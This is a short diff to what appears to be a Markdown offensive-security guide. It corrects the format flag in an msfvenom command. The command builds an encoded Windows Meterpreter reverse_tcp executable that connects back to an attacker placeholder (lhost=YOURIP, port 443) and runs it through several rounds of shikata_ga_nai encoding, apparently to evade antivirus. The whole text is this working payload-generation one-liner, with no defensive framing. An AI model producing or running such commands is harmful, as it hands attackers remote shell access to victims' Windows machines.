@@ -106,7 +106,7 @@
   <br>
 
 ``` 
-msfvenom --platform windows -p windows/meterpreter/reverse_tcp lhost=YOURIP lport=443 -e x86/shikata_ga_nai -i 7 -f exploit.exe -o exploit.exe
+msfvenom --platform windows -p windows/meterpreter/reverse_tcp lhost=YOURIP lport=443 -e x86/shikata_ga_nai -i 7 -f exe -o exploit.exe
 ```
 
  <br>
